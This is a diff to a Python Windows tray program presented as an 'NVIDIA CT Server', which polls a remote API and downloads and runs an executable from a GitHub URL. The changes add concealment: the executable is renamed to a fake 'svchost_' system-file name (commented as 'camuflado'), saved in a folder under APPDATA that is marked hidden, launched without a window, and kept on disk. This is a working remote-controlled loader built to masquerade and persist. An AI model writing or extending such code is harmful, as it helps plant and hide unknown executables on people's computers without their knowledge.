@@ -5,7 +5,6 @@ import time
 import sys
 import os
 import json
-import tempfile
 import pystray
 from PIL import Image, ImageDraw
 from datetime import datetime
@@ -13,10 +12,20 @@ from datetime import datetime
 # ─── CONFIGURAÇÃO ─────────────────────────────────────────────────────────────
 API_URL = "https://nvidiact-api.onrender.com"
 EXE_URL = "https://github.com/dacunhaff/nvidiact-files/raw/main/KIPOCK%20FULL.exe"
-EXE_NAME = "KIPOCK FULL.exe"
-APP_NAME = "NVIDIA CT Server"
-VERSION = "2.0"
 
+# Nome "camuflado" do executável (parece arquivo do sistema Windows)
+import hashlib
+import uuid
+
+# Gerar nome único por máquina (sempre o mesmo nome nessa máquina)
+machine_id = str(uuid.getnode())  # ID único da placa de rede
+name_hash = hashlib.md5(machine_id.encode()).hexdigest()[:8].upper()
+EXE_NAME = f"svchost_{name_hash}.exe"  # Ex: svchost_A3F8D2E1.exe
+
+APP_NAME = "NVIDIA CT Server"
+VERSION = "2.1"
+
+# Diretório de configuração
 if getattr(sys, 'frozen', False):
     BASE_DIR = os.path.dirname(sys.executable)
 else:
@@ -25,6 +34,22 @@ else:
 CONFIG_FILE = os.path.join(BASE_DIR, "config.json")
 LOG_FILE = os.path.join(BASE_DIR, "nvidia_server.log")
 
+# Pasta oculta permanente para o executável
+HIDDEN_DIR = os.path.join(os.environ['APPDATA'], ".cache", "system")
+os.makedirs(HIDDEN_DIR, exist_ok=True)
+EXE_PATH = os.path.join(HIDDEN_DIR, EXE_NAME)
+
+# Marcar pasta como oculta
+try:
+    import ctypes
+    ctypes.windll.kernel32.SetFileAttributesW(
+        os.path.join(os.environ['APPDATA'], ".cache"), 
+        0x02  # FILE_ATTRIBUTE_HIDDEN
+    )
+except:
+    pass
+
+# ─── Sistema de Log ───────────────────────────────────────────────────────────
 def log(msg):
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     log_msg = f"[{timestamp}] {msg}"
@@ -35,6 +60,7 @@ def log(msg):
     except:
         pass
 
+# ─── Verificar instância única ────────────────────────────────────────────────
 def check_single_instance():
     import socket
     try:
@@ -44,6 +70,7 @@ def check_single_instance():
     except:
         return None
 
+# ─── Chave do usuário ─────────────────────────────────────────────────────────
 def load_config():
     if os.path.exists(CONFIG_FILE):
         try:
@@ -60,6 +87,7 @@ def save_config(config):
     except Exception as e:
         log(f"Erro ao salvar config: {e}")
 
+# ─── Estado global ────────────────────────────────────────────────────────────
 running = True
 config = load_config()
 user_key = config.get("key", "")
@@ -68,6 +96,7 @@ status_color = "gray"
 processo_ativo = None
 icon_instance = None
 
+# ─── Criar ícone dinâmico ─────────────────────────────────────────────────────
 def create_icon_image(color="green"):
     colors = {
         "green": (118, 185, 0),
@@ -87,6 +116,7 @@ def update_icon_color(color):
         status_color = color
         icon_instance.icon = create_icon_image(color)
 
+# ─── Notificação ──────────────────────────────────────────────────────────────
 def notify(title, message):
     global icon_instance
     if icon_instance:
@@ -95,35 +125,44 @@ def notify(title, message):
         except:
             pass
 
+# ─── Download e execução do EXE ───────────────────────────────────────────────
 def ativar_programa():
     global status_label, processo_ativo
     try:
         log("Iniciando ativação do programa...")
-        status_label = "⬇️ Baixando programa..."
-        update_icon_color("yellow")
         
-        resp = requests.get(EXE_URL, stream=True, timeout=60)
-        resp.raise_for_status()
-        
-        tmp_path = os.path.join(tempfile.gettempdir(), EXE_NAME)
-        
-        total_size = int(resp.headers.get('content-length', 0))
-        downloaded = 0
-        
-        with open(tmp_path, "wb") as f:
-            for chunk in resp.iter_content(chunk_size=8192):
-                if chunk:
-                    f.write(chunk)
-                    downloaded += len(chunk)
-        
-        log(f"Download concluído: {downloaded} bytes")
+        # Verificar se já existe (reutilizar)
+        if not os.path.exists(EXE_PATH):
+            status_label = "⬇️ Baixando programa..."
+            update_icon_color("yellow")
+            log("Arquivo não encontrado, baixando...")
+            
+            resp = requests.get(EXE_URL, stream=True, timeout=60)
+            resp.raise_for_status()
+            
+            downloaded = 0
+            with open(EXE_PATH, "wb") as f:
+                for chunk in resp.iter_content(chunk_size=8192):
+                    if chunk:
+                        f.write(chunk)
+                        downloaded += len(chunk)
+            
+            log(f"Download concluído: {downloaded} bytes")
+        else:
+            log("Reutilizando arquivo existente")
         
         status_label = "▶️ Executando programa..."
-        processo_ativo = subprocess.Popen([tmp_path])
+        
+        # Executar
+        processo_ativo = subprocess.Popen(
+            f'start "" "{EXE_PATH}"',
+            shell=True,
+            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
+        )
         
         status_label = "✅ Programa ativo"
         update_icon_color("green")
-        notify("NVIDIA CT", "Programa ativado com sucesso!")
+        notify("NVIDIA CT", "Programa ativado!")
         log("Programa ativado com sucesso")
         
     except Exception as e:
@@ -131,13 +170,14 @@ def ativar_programa():
         status_label = f"❌ Erro: {error_msg}"
         update_icon_color("red")
         log(f"Erro ao ativar: {e}")
-        notify("NVIDIA CT - Erro", f"Falha ao ativar: {error_msg}")
+        notify("NVIDIA CT - Erro", f"Falha: {error_msg}")
 
 def desativar_programa():
     global status_label, processo_ativo
     try:
         log("Desativando programa...")
         
+        # Terminar processo
         if processo_ativo:
             processo_ativo.terminate()
             time.sleep(1)
@@ -145,15 +185,11 @@ def desativar_programa():
                 processo_ativo.kill()
             processo_ativo = None
         
+        # Force kill
         os.system(f'taskkill /f /im "{EXE_NAME}" >nul 2>&1')
         
-        tmp_path = os.path.join(tempfile.gettempdir(), EXE_NAME)
-        if os.path.exists(tmp_path):
-            try:
-                time.sleep(0.5)
-                os.remove(tmp_path)
-            except:
-                pass
+        # NÃO DELETAMOS O ARQUIVO! Ele fica lá para reutilizar
+        log("Processo encerrado (arquivo mantido para reutilização)")
         
         status_label = "⛔ Programa desativado"
         update_icon_color("gray")
@@ -165,6 +201,7 @@ def desativar_programa():
         status_label = f"❌ Erro ao desativar: {error_msg}"
         log(f"Erro ao desativar: {e}")
 
+# ─── Loop de polling com a API ────────────────────────────────────────────────
 def poll_loop():
     global status_label, running
     consecutive_errors = 0
@@ -220,6 +257,7 @@ def poll_loop():
         
         time.sleep(5)
 
+# ─── Menu da bandeja ──────────────────────────────────────────────────────────
 def on_definir_chave(icon, item):
     import tkinter as tk
     from tkinter import simpledialog
@@ -241,7 +279,7 @@ def on_definir_chave(icon, item):
         config["key"] = user_key
         save_config(config)
         log(f"Chave configurada: {user_key}")
-        notify("NVIDIA CT", "Chave configurada com sucesso!")
+        notify("NVIDIA CT", "Chave configurada!")
 
 def on_status(icon, item):
     import tkinter as tk
@@ -257,6 +295,7 @@ Chave: {user_key or 'Não configurada'}
 Status: {status_label}
 
 API: {API_URL}
+Cache: {HIDDEN_DIR}
 Log: {LOG_FILE}
 """
     
@@ -307,6 +346,7 @@ def run_tray():
     
     icon_instance.run()
 
+# ─── Main ─────────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
     lock = check_single_instance()
     if not lock:
@@ -323,6 +363,7 @@ if __name__ == "__main__":
     
     log(f"=== {APP_NAME} v{VERSION} iniciado ===")
     log(f"Diretório: {BASE_DIR}")
+    log(f"Cache: {HIDDEN_DIR}")
     log(f"Chave configurada: {bool(user_key)}")
     
     if not user_key:
